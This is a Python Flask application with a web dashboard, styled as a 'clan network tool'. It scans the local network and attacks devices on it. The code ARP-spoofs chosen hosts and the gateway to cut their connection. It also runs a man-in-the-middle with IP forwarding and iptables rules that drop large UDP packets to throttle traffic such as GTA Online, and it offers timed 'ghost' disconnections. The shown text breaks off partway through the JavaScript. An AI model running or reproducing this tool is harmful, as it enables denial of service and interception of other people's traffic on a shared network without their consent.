import os
import time
import threading
import socket
import sys
import json
import logging
from scapy.all import ARP, Ether, IP, ICMP, srp, sendp, conf
from flask import Flask, jsonify, request, render_template_string
# Disable Flask startup logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# --- Application State ---
state = {
    "scanning": False,
    "gateway_ip": "",
    "subnet": "192.168.1.0/24",
    "iface": None,
    "devices": [], # list of dicts: {'ip': str, 'mac': str}
    "active_attacks": {}, # dict of ip: threading.Event()
    "active_mtu_limits": {}, # dict of ip: {'event': threading.Event(), 'val': int}
    "solo_lobby_active": False,
    "solo_lobby_expires": 0,
    "solo_lobby_target": None,
    "nicknames": {} # dict of mac: str
}

NICKNAMES_FILE = 'nicknames.json'
try:
    if os.path.exists(NICKNAMES_FILE):
        with open(NICKNAMES_FILE, 'r') as f:
            state["nicknames"] = json.load(f)
except Exception as e:
    print(f"[!] Failed to load nicknames: {e}")

def get_default_network_info():
    try:
        iface, local_ip, gw_ip = conf.route.route("0.0.0.0")
        subnet = f"{local_ip.rsplit('.', 1)[0]}.0/24"
        return gw_ip, subnet, iface
    except:
        return "192.168.1.1", "192.168.1.0/24", conf.iface

state["gateway_ip"], state["subnet"], state["iface"] = get_default_network_info()

# --- Backend Network Logic ---
def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), iface=state["iface"], timeout=2, verbose=0)
        if ans: return ans[0][1].hwsrc
    except: pass
    return None

def spoof_loop(target_ip, gateway_ip, stop_event):
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if not target_mac or not gateway_mac: return
        while not stop_event.is_set():
            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), iface=state["iface"], verbose=0)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), iface=state["iface"], verbose=0)
            time.sleep(2)
    except: pass

def mtu_limit_mitm_loop(target_ip, gateway_ip, mtu_val, stop_event):
    """
    Enforces an MTU limit over ALL protocols by:
    1. ARP-spoofing the target to route their traffic through this machine (MitM).
    2. Enabling IP forwarding so we relay packets instead of dropping them.
    3. TCP: Clamping the TCP MSS to (mtu_val - 40) via iptables mangle.
    4. UDP: Dropping any UDP packet larger than mtu_val via iptables length matching.
       This covers GTA Online, which runs on UDP.
    """
    mtu_val = int(mtu_val)
    mss_val = max(1, mtu_val - 40)
    udp_drop_threshold = mtu_val + 1  # drop packets strictly larger than mtu_val

    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if not target_mac or not gateway_mac:
            print(f"[!] MTU Limit: Could not resolve MACs for {target_ip}")
            return

        # Enable IP forwarding so we relay packets as a router
        os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")

        # Insert rules at the TOP of the FORWARD chain so they evaluate before Docker's chains.
        # Order matters — insert in reverse so final order is: DROP oversized UDP -> ACCEPT rest.

        # Step 1: ACCEPT all non-oversized traffic (inserted first, will end up at positions 3 & 4)
        os.system(f"iptables -I FORWARD 1 -d {target_ip} -j ACCEPT")
        os.system(f"iptables -I FORWARD 1 -s {target_ip} -j ACCEPT")

        # Step 2: DROP oversized UDP (inserted after, will end up at positions 1 & 2)
        os.system(f"iptables -I FORWARD 1 -d {target_ip} -p udp -m length --length {udp_drop_threshold}:65535 -j DROP")
        os.system(f"iptables -I FORWARD 1 -s {target_ip} -p udp -m length --length {udp_drop_threshold}:65535 -j DROP")

        # TCP MSS Clamping (mangle table, direction doesn't interact with FORWARD policy)
        os.system(f"iptables -t mangle -A FORWARD -s {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")
        os.system(f"iptables -t mangle -A FORWARD -d {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")

        print(f"[+] MTU Limit active for {target_ip}: TCP MSS={mss_val}, UDP drop>{mtu_val}B")

        # ARP spoof loop — poisons target AND gateway to route traffic through us
        while not stop_event.is_set():
            # Tell target: "I am the gateway"
            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), iface=state["iface"], verbose=0)
            # Tell gateway: "I am the target"
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), iface=state["iface"], verbose=0)
            time.sleep(2)

    except Exception as e:
        print(f"[!] MTU Limit error: {e}")
    finally:
        # --- Remove TCP MSS clamping rules ---
        os.system(f"iptables -t mangle -D FORWARD -s {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")
        os.system(f"iptables -t mangle -D FORWARD -d {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")

        # --- Remove UDP drop rules ---
        os.system(f"iptables -D FORWARD -s {target_ip} -p udp -m length --length {udp_drop_threshold}:65535 -j DROP")
        os.system(f"iptables -D FORWARD -d {target_ip} -p udp -m length --length {udp_drop_threshold}:65535 -j DROP")

        # --- Remove ACCEPT forwarding rules ---
        os.system(f"iptables -D FORWARD -s {target_ip} -j ACCEPT")
        os.system(f"iptables -D FORWARD -d {target_ip} -j ACCEPT")

        print(f"[-] MTU Limit removed for {target_ip}")

        # Restore ARP tables on target and gateway
        try:
            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=state["iface"], count=3, verbose=0)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=state["iface"], count=3, verbose=0)
        except:
            pass



def run_arp_scan(subnet):
    state["scanning"] = True
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), iface=state["iface"], timeout=5, retry=1, verbose=0)
        found_devices = []
        for s, r in ans:
            if r.psrc != state["gateway_ip"]:
                found_devices.append({"ip": r.psrc, "mac": r.hwsrc})
        
        state["devices"] = found_devices
    except Exception as e:
        print(f"[!] Scan error: {e}")
    finally:
        state["scanning"] = False

def timed_intercept_logic(target_ip, gateway_ip, duration_ms):
    state["solo_lobby_active"] = True
    state["solo_lobby_target"] = target_ip
    state["solo_lobby_expires"] = time.time() + (float(duration_ms) / 1000.0)
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if not target_mac: return
        
        stop_event = threading.Event()
        threading.Thread(target=spoof_loop, args=(target_ip, gateway_ip, stop_event), daemon=True).start()
        
        while time.time() < state["solo_lobby_expires"]:
            time.sleep(0.05)
            
        stop_event.set()
        
        if target_mac and gateway_mac:
            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=state["iface"], count=3, verbose=0)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=state["iface"], count=3, verbose=0)
            
    except Exception as e:
        print(f"[!] Timed cut error: {e}")
    finally:
        state["solo_lobby_active"] = False
        state["solo_lobby_expires"] = 0
        state["solo_lobby_target"] = None

# --- Web API Endpoints ---
@app.route('/api/status', methods=['GET'])
def api_status():
    devices_enriched = []
    for d in state["devices"]:
        mtu_limit = None
        if d["ip"] in state["active_mtu_limits"]:
            mtu_limit = state["active_mtu_limits"][d["ip"]]["val"]
            
        devices_enriched.append({
            "ip": d["ip"],
            "mac": d["mac"],
            "nickname": state["nicknames"].get(d["mac"], ""),
            "is_cut": d["ip"] in state["active_attacks"],
            "mtu_limit": mtu_limit
        })
        
    return jsonify({
        "gateway_ip": state["gateway_ip"],
        "subnet": state["subnet"],
        "scanning": state["scanning"],
        "devices": devices_enriched,
        "solo_lobby_active": state["solo_lobby_active"],
        "solo_lobby_timer": max(0, state["solo_lobby_expires"] - time.time()) if state["solo_lobby_active"] else 0,
        "solo_lobby_target": state["solo_lobby_target"]
    })

@app.route('/api/nickname', methods=['POST'])
def api_nickname():
    mac = request.json.get('mac')
    nickname = request.json.get('nickname', '')
    if mac:
        state["nicknames"][mac] = nickname
        try:
            with open(NICKNAMES_FILE, 'w') as f:
                json.dump(state["nicknames"], f)
        except Exception as e:
            print(f"[!] Failed to save nickname: {e}")
    return jsonify({"success": True})

@app.route('/api/scan', methods=['POST'])
def api_scan():
    if not state["scanning"]:
        data = request.json
        if data and 'subnet' in data:
            state["subnet"] = data['subnet']
        if data and 'gateway' in data:
            state["gateway_ip"] = data['gateway']
            
        state["devices"] = [] # Clear old list
        threading.Thread(target=run_arp_scan, args=(state["subnet"],), daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/toggle_cut', methods=['POST'])
def api_toggle_cut():
    target_ip = request.json.get('ip')
    gateway_ip = state["gateway_ip"]
    
    if target_ip == gateway_ip:
        return jsonify({"error": "Cannot cut the gateway."}), 400
        
    if target_ip in state["active_attacks"]:
        state["active_attacks"][target_ip].set()
        del state["active_attacks"][target_ip]
    else:
        stop_event = threading.Event()
        state["active_attacks"][target_ip] = stop_event
        threading.Thread(target=spoof_loop, args=(target_ip, gateway_ip, stop_event), daemon=True).start()
        
    return jsonify({"success": True, "is_cut": target_ip in state["active_attacks"]})

@app.route('/api/toggle_mtu', methods=['POST'])
def api_toggle_mtu():
    target_ip = request.json.get('ip')
    mtu_val = request.json.get('mtu', 800)
    gateway_ip = state["gateway_ip"]
    
    if target_ip == gateway_ip:
        return jsonify({"error": "Cannot limit gateway."}), 400
        
    if target_ip in state["active_mtu_limits"]:
        state["active_mtu_limits"][target_ip]['event'].set()
        del state["active_mtu_limits"][target_ip]
    else:
        try:
            mtu_val = int(mtu_val)
        except:
            mtu_val = 800
        stop_event = threading.Event()
        state["active_mtu_limits"][target_ip] = {'event': stop_event, 'val': mtu_val}
        threading.Thread(target=mtu_limit_mitm_loop, args=(target_ip, gateway_ip, mtu_val, stop_event), daemon=True).start()
        
    return jsonify({"success": True})

@app.route('/api/solo_lobby', methods=['POST'])
def api_solo_lobby():
    target_ip = request.json.get('ip')
    duration_ms = request.json.get('duration_ms', 8000)
    gateway_ip = state["gateway_ip"]
    
    if state["solo_lobby_active"]:
        return jsonify({"error": "Process already running"}), 400
    if not target_ip or target_ip == gateway_ip:
        return jsonify({"error": "Invalid target IP"}), 400
        
    threading.Thread(target=timed_intercept_logic, args=(target_ip, gateway_ip, duration_ms), daemon=True).start()
    return jsonify({"success": True})

# --- Embedded HTML/JS Template ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HANOI PROTOCOL // CLAN NETWORK TOOL</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root {
            --bg: #07070f;
            --bg2: #0c0c1a;
            --bg3: #10101e;
            --cyan: #00ffd1;
            --red: #ff003c;
            --gold: #ffc400;
            --text: #c8d8e8;
            --dim: #556677;
            --cyan-glow: rgba(0,255,209,0.18);
            --red-glow: rgba(255,0,60,0.18);
        }
        * { box-sizing: border-box; }
        body {
            background-color: var(--bg);
            background-image:
                linear-gradient(rgba(0,255,209,0.025) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0,255,209,0.025) 1px, transparent 1px);
            background-size: 44px 44px;
            font-family: 'Rajdhani', sans-serif;
            color: var(--text);
            min-height: 100vh;
        }
        body::after {
            content:''; position:fixed; inset:0; pointer-events:none; z-index:9999;
            background: repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.08) 3px,rgba(0,0,0,0.08) 4px);
        }
        .mono { font-family: 'Share Tech Mono', monospace; }
        .orb  { font-family: 'Orbitron', sans-serif; }
        .card {
            background: var(--bg3);
            border: 1px solid rgba(0,255,209,0.15);
            box-shadow: 0 0 18px rgba(0,255,209,0.05), inset 0 0 30px rgba(0,0,0,0.4);
            transition: border-color .2s, box-shadow .2s;
        }
        .card:hover { border-color: rgba(0,255,209,0.35); box-shadow: 0 0 28px rgba(0,255,209,0.12); }
        .neon-cyan  { color: var(--cyan); text-shadow: 0 0 10px var(--cyan); }
        .neon-red   { color: var(--red);  text-shadow: 0 0 10px var(--red); }
        .neon-gold  { color: var(--gold); text-shadow: 0 0 8px var(--gold); }
        .badge { display:block; text-align:center; padding:6px 10px; border-radius:4px; font-weight:700; letter-spacing:.08em; font-size:.75rem; }
        .badge-green { background:rgba(0,255,150,0.08); color:#00ff96; border:1px solid rgba(0,255,150,0.25); }
        .badge-red   { background:rgba(255,0,60,0.1);   color:#ff003c; border:1px solid rgba(255,0,60,0.3);   box-shadow:0 0 8px rgba(255,0,60,0.2); }
        .badge-cyan  { background:rgba(0,255,209,0.08); color:#00ffd1; border:1px solid rgba(0,255,209,0.4);   box-shadow:0 0 10px rgba(0,255,209,0.25); animation:pulse-cyan 1.4s ease-in-out infinite; }
        .badge-gold  { background:rgba(255,196,0,0.08); color:#ffc400; border:1px solid rgba(255,196,0,0.3); }
        @keyframes pulse-cyan { 0%,100%{box-shadow:0 0 8px rgba(0,255,209,0.3)} 50%{box-shadow:0 0 20px rgba(0,255,209,0.7)} }
        .btn { font-family:'Rajdhani',sans-serif; font-weight:700; letter-spacing:.06em; border-radius:3px; cursor:pointer; transition:all .15s; text-transform:uppercase; font-size:.8rem; }
        .btn-red   { background:transparent; color:var(--red);  border:1px solid var(--red);  padding:8px 14px; }
        .btn-red:hover   { background:rgba(255,0,60,0.15);   box-shadow:0 0 12px rgba(255,0,60,0.4); }
        .btn-cyan  { background:transparent; color:var(--cyan); border:1px solid var(--cyan); padding:8px 14px; }
        .btn-cyan:hover  { background:rgba(0,255,209,0.1);   box-shadow:0 0 12px rgba(0,255,209,0.4); }
        .btn-gold  { background:transparent; color:var(--gold); border:1px solid var(--gold); padding:8px 14px; }
        .btn-gold:hover  { background:rgba(255,196,0,0.1);   box-shadow:0 0 12px rgba(255,196,0,0.4); }
        .btn-blue  { background:transparent; color:#7b8fff;     border:1px solid #7b8fff;     padding:8px 14px; }
        .btn-blue:hover  { background:rgba(123,143,255,0.1);  box-shadow:0 0 12px rgba(123,143,255,0.4); }
        .btn:disabled { opacity:.35; cursor:not-allowed; box-shadow:none; }
        .hp-input {
            background:rgba(0,0,0,0.5); border:1px solid rgba(0,255,209,0.2); color:var(--cyan);
            font-family:'Share Tech Mono',monospace; border-radius:3px; padding:8px 10px; width:100%;
            font-size:.85rem; outline:none; transition:border-color .2s;
        }
        .hp-input:focus { border-color:var(--cyan); box-shadow:0 0 8px rgba(0,255,209,0.3); }
        .hp-input-sm { padding:6px 8px; font-size:.78rem; }
        .sort-th { cursor:pointer; font-family:'Rajdhani',sans-serif; font-weight:600; letter-spacing:.1em; font-size:.7rem; text-transform:uppercase; color:var(--dim); transition:color .15s; padding:12px 16px; }
        .sort-th:hover { color:var(--cyan); }
        label.hp-label { font-size:.65rem; font-weight:700; letter-spacing:.12em; text-transform:uppercase; color:var(--dim); display:block; margin-bottom:4px; }
        .corner::before,.corner::after { content:''; position:absolute; width:8px; height:8px; border-color:var(--cyan); border-style:solid; opacity:.5; }
        .corner::before { top:0; left:0; border-width:1px 0 0 1px; }
        .corner::after  { bottom:0; right:0; border-width:0 1px 1px 0; }
        @media (max-width: 768px) {
            .device-row { display:flex !important; flex-direction:column; gap:14px; padding:18px 16px !important; }
            .mobile-label { display:block !important; }
            #desktop-header { display:none !important; }
            .action-col { align-items:stretch !important; }
            .action-col button, .action-col > div { width:100% !important; }
        }
    </style>
</head>
<body style="margin:0;padding:0">

    <!-- Header -->
    <header style="background:rgba(7,7,15,0.97);border-bottom:1px solid rgba(0,255,209,0.2);box-shadow:0 0 30px rgba(0,255,209,0.08);padding:12px 24px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:50;backdrop-filter:blur(10px);">
        <div style="display:flex;align-items:center;gap:16px;">
            <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
                <polygon points="18,2 34,10 34,26 18,34 2,26 2,10" stroke="#00ffd1" stroke-width="1.5" fill="rgba(0,255,209,0.05)"/>
                <polygon points="18,8 28,13 28,23 18,28 8,23 8,13" stroke="#ff003c" stroke-width="1" fill="rgba(255,0,60,0.05)"/>
                <circle cx="18" cy="18" r="4" fill="#00ffd1" opacity="0.9"/>
                <line x1="18" y1="2" x2="18" y2="8" stroke="#00ffd1" stroke-width="1"/>
                <line x1="18" y1="28" x2="18" y2="34" stroke="#00ffd1" stroke-width="1"/>
                <line x1="2" y1="10" x2="8" y2="13" stroke="#00ffd1" stroke-width="1"/>
                <line x1="28" y1="23" x2="34" y2="26" stroke="#00ffd1" stroke-width="1"/>
                <line x1="34" y1="10" x2="28" y2="13" stroke="#00ffd1" stroke-width="1"/>
                <line x1="8" y1="23" x2="2" y2="26" stroke="#00ffd1" stroke-width="1"/>
            </svg>
            <div>
                <div class="orb" style="font-size:1.1rem;font-weight:900;letter-spacing:.15em;color:#00ffd1;text-shadow:0 0 16px #00ffd1;">HANOI<span style="color:#ff003c;text-shadow:0 0 16px #ff003c;"> PROTOCOL</span></div>
                <div style="font-size:.6rem;letter-spacing:.25em;color:#556677;font-family:'Share Tech Mono',monospace;">CLAN NETWORK OPERATIONS // v2.0</div>
            </div>
        </div>
        <div style="font-family:'Share Tech Mono',monospace;font-size:.65rem;color:#556677;text-align:right;">
            <div style="color:#00ffd1;" id="hdr-time"></div>
            <div>HANOI // ONLINE</div>
        </div>
    </header>

    <!-- Main Content -->
    <main style="flex:1;padding:20px 24px;max-width:1600px;margin:0 auto;width:100%;">

        <div id="view-network" style="display:flex;flex-direction:column;gap:20px;">
            <!-- Control Panel -->
            <div class="card relative corner" style="padding:20px 24px;display:flex;flex-wrap:wrap;gap:16px;align-items:flex-end;">
                <div style="flex:1;min-width:140px;">
                    <label class="hp-label">Subnet</label>
                    <input type="text" id="inp-subnet" class="hp-input" placeholder="192.168.1.0/24">
                </div>
                <div style="flex:1;min-width:140px;">
                    <label class="hp-label">Gateway</label>
                    <input type="text" id="inp-gateway" class="hp-input" placeholder="192.168.1.1">
                </div>
                <div style="flex:2;min-width:200px;">
                    <label class="hp-label">Search Devices</label>
                    <input type="text" id="inp-search" class="hp-input" placeholder="Search IP, MAC, Nickname, Vendor..." oninput="fetchStatus()">
                </div>
                <button id="btn-scan" onclick="triggerScan()" class="btn btn-cyan" style="display:flex;align-items:center;gap:8px;white-space:nowrap;">
                    <svg id="icon-scan" width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
                    <span id="text-scan">SCAN NETWORK</span>
                </button>
            </div>

            <!-- Mobile Sort -->
            <div class="card" style="padding:12px 16px;display:flex;align-items:center;gap:12px;" id="mobile-sort-bar">
                <label class="hp-label" style="margin:0;white-space:nowrap;">SORT BY</label>
                <select id="mobile-sort" onchange="setSort(this.value)" class="hp-input" style="margin:0;">
                    <option value="ip">IP Address</option>
                    <option value="mac">MAC Address</option>
                    <option value="nickname">Nickname</option>
                    <option value="is_cut">Status</option>
                </select>
            </div>

            <!-- Device Table -->
            <div class="card" style="overflow:hidden;">
                <!-- Desktop Header -->
                <div style="display:grid;grid-template-columns:repeat(5,1fr);border-bottom:1px solid rgba(0,255,209,0.12);background:rgba(0,0,0,0.4);" id="desktop-header">
                    <div class="sort-th" onclick="setSort('ip')">IP ADDRESS <span id="sort-ip"></span></div>
                    <div class="sort-th" onclick="setSort('mac')">MAC <span id="sort-mac"></span></div>
                    <div class="sort-th" onclick="setSort('nickname')">NICKNAME <span id="sort-nickname"></span></div>
                    <div class="sort-th" onclick="setSort('is_cut')">STATUS <span id="sort-is_cut"></span></div>
                    <div class="sort-th" style="text-align:right;">ACTIONS</div>
                </div>
                <div id="device-table-body" style="display:flex;flex-direction:column;gap:0;">
                    <div style="padding:40px;text-align:center;color:#556677;font-family:'Share Tech Mono',monospace;font-size:.85rem;">// RUN A SCAN TO ENUMERATE NETWORK DEVICES</div>
                </div>
            </div>
        </div>
    </main>

    <script>
        let focusedInputId = null;
        let pendingNicknames = {};
        let pendingTimes = {};
        let pendingMtu = {};
        
        let currentSortCol = 'ip';
        let sortDesc = false;

        // Smooth Timer Update Loop
        function updateTimers() {
            document.querySelectorAll('.ghost-timer').forEach(el => {
                const expire = parseFloat(el.getAttribute('data-expire'));
                const now = Date.now();
                const diff = Math.max(0, (expire - now) / 1000);
                if (diff <= 0) {
                    el.innerText = "0.000";
                    // Trigger a status fetch if it just finished to clean up UI
                    if (!el.getAttribute('data-finished')) {
                        el.setAttribute('data-finished', 'true');
                        setTimeout(fetchStatus, 500);
                    }
                } else {
                    el.innerText = diff.toFixed(3);
                }
            });
            requestAnimationFrame(updateTimers);
        }
        requestAnimationFrame(updateTimers);

        setInterval(() => {
            const now = new Date();
            const el = document.getElementById('hdr-time');
            if (el) el.innerText = now.toLocaleTimeString('en-US', {hour12: false});
        }, 1000);

        function setSort(col) {
            if (currentSortCol === col) {
                sortDesc = !sortDesc;
            } else {
                currentSortCol = col;
                sortDesc = false;
            }
            updateSortIcons();
            fetchStatus(); 
        }
        
        function updateSortIcons() {
            const cols = ['ip', 'mac', 'nickname', 'is_cut'];
            cols.forEach(c => {
                const el = document.getElementById('sort-' + c);
                if (el) {
                    if (c === currentSortCol) {
                        el.innerText = sortDesc ? '▼' : '▲';
                    } else {
                        el.innerText = '';
                    }
                }
            });
        }

        async function updateNickname(mac, nickname) {
            await fetch('/api/nickname', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({mac, nickname})
            });
        }

        async function fetchStatus() {
            try {
                const res = await fetch('/api/status');
                const data = await res.json();
                
                if (!document.getElementById('inp-subnet').value) document.getElementById('inp-subnet').value = data.subnet;
                if (!document.getElementById('inp-gateway').value) document.getElementById('inp-gateway').value = data.gateway_ip;

                const btnScan = document.getElementById('btn-scan');
                const textScan = document.getElementById('text-scan');
                const iconScan = document.getElementById('icon-scan');
                if (data.scanning) {
                    btnScan.style.color='#556677'; btnScan.style.borderColor='#556677'; btnScan.style.boxShadow='none';
                    btnScan.disabled = true;
                    textScan.innerText = "SCANNING...";
                    iconScan.style.animation = 'spin 1s linear infinite';
                } else {
                    btnScan.style.color=''; btnScan.style.borderColor=''; btnScan.style.boxShadow='';
                    btnScan.disabled = false;
                    textScan.innerText = "SCAN NETWORK";
                    iconScan.style.animation = '';
                }

                // Sort devices
                let sortedDevices = data.devices;
                if (currentSortCol) {
                    sortedDevices = sortedDevices.sort((a, b) => {
                        let valA = a[currentSortCol] !== undefined && a[currentSortCol] !== null ? a[currentSortCol] : '';
                        let valB = b[currentSortCol] !== undefined && b[currentSortCol] !== null ? b[currentSortCol] : '';
                        
                        if (currentSortCol === 'ip') {
                            const numA = valA.split('.').map(Number).reduce((acc, val) => (acc << 8) + val, 0);
                            const numB = valB.split('.').map(Number).reduce((acc, val) => (acc << 8) + val, 0);
                            return sortDesc ? numB - numA : numA - numB;
                        }
                        if (typeof valA === 'boolean') valA = valA ? 1 : 0;
                        if (typeof valB === 'boolean') valB = valB ? 1 : 0;
                        if (typeof valA === 'string') valA = valA.toLowerCase();
                        if (typeof valB === 'string') valB = valB.toLowerCase();
                        
                        if (valA < valB) return sortDesc ? 1 : -1;
                        if (valA > valB) return sortDesc ? -1 : 1;
                        return 0;
                    });
                }

                // Filter by search
                const searchQ = document.getElementById('inp-search').value.toLowerCase();
                let filteredDevices = sortedDevices;
                if (searchQ) {
                    filteredDevices = sortedDevices.filter(d => {
                        const nick = pendingNicknames[d.mac] !== undefined ? pendingNicknames[d.mac] : d.nickname;
                        return (d.ip && d.ip.toLowerCase().includes(searchQ)) ||
                               (d.mac && d.mac.toLowerCase().includes(searchQ)) ||
                               (nick && nick.toLowerCase().includes(searchQ));
                    });
                }

                renderTable(filteredDevices, data);

            } catch (err) {
                console.error("Failed to fetch status", err);
            }
        }

        function renderTable(devices, globalData) {
            const tbody = document.getElementById('device-table-body');
            if (devices.length === 0) {
                if(!document.getElementById('btn-scan').disabled) {
                    tbody.innerHTML = "<div style='padding:40px;text-align:center;color:#556677;font-size:.85rem;'>// NO DEVICES FOUND &mdash; RETRY SCAN</div>";
                }
                return;
            }

            let html = '';
            devices.forEach((dev, index) => {
                const is_cut = dev.is_cut || globalData.solo_lobby_active;

                let statusBadge = '';
                if (globalData.solo_lobby_active && globalData.solo_lobby_target === dev.ip) {
                    const expireAt = Date.now() + (globalData.solo_lobby_timer * 1000);
                    statusBadge = `<span class="badge badge-cyan">◈ SOLO LOBBY: <span class="ghost-timer mono" data-expire="${expireAt}">${globalData.solo_lobby_timer.toFixed(3)}</span>s</span>`;
                } else if (is_cut) {
                    statusBadge = '<span class="badge badge-red">✕ OFFLINE</span>';
                } else {
                    statusBadge = '<span class="badge badge-green">◉ ONLINE</span>';
                }
                if (dev.mtu_limit !== null) {
                    statusBadge += `<span class="badge badge-gold" style="margin-top:6px;">⊘ MTU: ${dev.mtu_limit}</span>`;
                }

                const actionCutText = dev.is_cut ? 'RESTORE' : 'CUT CONN';
                const actionCutClass = dev.is_cut ? 'btn btn-cyan' : 'btn btn-red';
                const currentNick = pendingNicknames[dev.mac] !== undefined ? pendingNicknames[dev.mac] : dev.nickname;
                const currentTime = pendingTimes[dev.ip] !== undefined ? pendingTimes[dev.ip] : "8000";
                const isMtuActive = dev.mtu_limit !== null;
                const currentMtuVal = pendingMtu[dev.ip] !== undefined ? pendingMtu[dev.ip] : (isMtuActive ? dev.mtu_limit : "800");
                const actionMtuText = isMtuActive ? 'STOP MTU' : 'LIMIT MTU';
                const actionMtuClass = isMtuActive ? 'btn btn-cyan' : 'btn btn-gold';

                html += `
                <div class="device-row" style="border-bottom:1px solid rgba(0,255,209,0.07);padding:14px 16px;display:grid;grid-template-columns:repeat(5,1fr);gap:12px;align-items:center;transition:background .15s;" onmouseover="this.style.background='rgba(0,255,209,0.03)'" onmouseout="this.style.background=''">
                    <div>
                        <div class="mobile-label" style="display:none;font-size:.6rem;color:#556677;letter-spacing:.15em;margin-bottom:4px;">IP ADDRESS</div>
                        <div class="mono neon-cyan" style="font-size:.95rem;font-weight:700;">${dev.ip}</div>
                    </div>
                    <div>
                        <div class="mobile-label" style="display:none;font-size:.6rem;color:#556677;letter-spacing:.15em;margin-bottom:4px;">MAC ADDRESS</div>
                        <div class="mono" style="font-size:.75rem;color:#667788;">${dev.mac}</div>
                    </div>
                    <div>
                        <div class="mobile-label" style="display:none;font-size:.6rem;color:#556677;letter-spacing:.15em;margin-bottom:4px;">NICKNAME</div>
                        <input type="text" id="nick-${dev.mac}" class="hp-input hp-input-sm"
                            placeholder="// alias..."
                            value="${currentNick}"
                            onfocus="focusedInputId = this.id"
                            onblur="focusedInputId = null; pendingNicknames['${dev.mac}'] = undefined; updateNickname('${dev.mac}', this.value)"
                            oninput="pendingNicknames['${dev.mac}'] = this.value">
                    </div>
                    <div>
                        <div class="mobile-label" style="display:none;font-size:.6rem;color:#556677;letter-spacing:.15em;margin-bottom:4px;">STATUS</div>
                        ${statusBadge}
                    </div>
                    <div class="action-col" style="display:flex;flex-direction:column;align-items:flex-end;gap:6px;">
                        <button onclick="toggleCut('${dev.ip}')" class="${actionCutClass}" style="width:100%;text-align:center;">${actionCutText}</button>
                        <div style="display:flex;gap:6px;width:100%;">
                            <input type="number" id="mtu-${dev.ip}" class="hp-input hp-input-sm" style="width:60px;text-align:center;"
                                value="${currentMtuVal}"
                                onfocus="focusedInputId = this.id"
                                onblur="focusedInputId = null"
                                oninput="pendingMtu['${dev.ip}'] = this.value">
                            <button onclick="toggleMtu('${dev.ip}', 'mtu-${dev.ip}')" class="${actionMtuClass}" style="flex:1;text-align:center;">${actionMtuText}</button>
                        </div>
                        <div style="display:flex;gap:6px;width:100%;">
                            <input type="number" id="time-${dev.ip}" class="hp-input hp-input-sm" style="width:60px;text-align:center;"
                                value="${currentTime}"
                                onfocus="focusedInputId = this.id"
                                onblur="focusedInputId = null"
                                oninput="pendingTimes['${dev.ip}'] = this.value">
                            <button onclick="triggerSoloLobby('${dev.ip}', 'time-${dev.ip}')" ${globalData.solo_lobby_active ? 'disabled' : ''} class="btn btn-blue" style="flex:1;text-align:center;">GHOST</button>
                        </div>
                    </div>
                </div>`;
            });

            // Only update DOM if not currently typing, to prevent stealing focus
            if (focusedInputId) {
                return;
            }
            tbody.innerHTML = html;
        }

        async function triggerScan() {
            const subnet = document.getElementById('inp-subnet').value;
            const gateway = document.getElementById('inp-gateway').value;
            await fetch('/api/scan', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({subnet, gateway})
            });
            fetchStatus();
        }

        async function toggleCut(ip) {
            await fetch('/api/toggle_cut', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip})
            });
            fetchStatus();
        }

        async function toggleMtu(ip, inputId) {
            const mtuVal = document.getElementById(inputId).value;
            await fetch('/api/toggle_mtu', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip: ip, mtu: parseInt(mtuVal) || 800})
            });
            fetchStatus();
        }

        async function triggerSoloLobby(targetIp, timeInputId) {
            if(!targetIp) return;
            const timeVal = document.getElementById(timeInputId).value;
            const durationMs = parseInt(timeVal) || 8000;
            
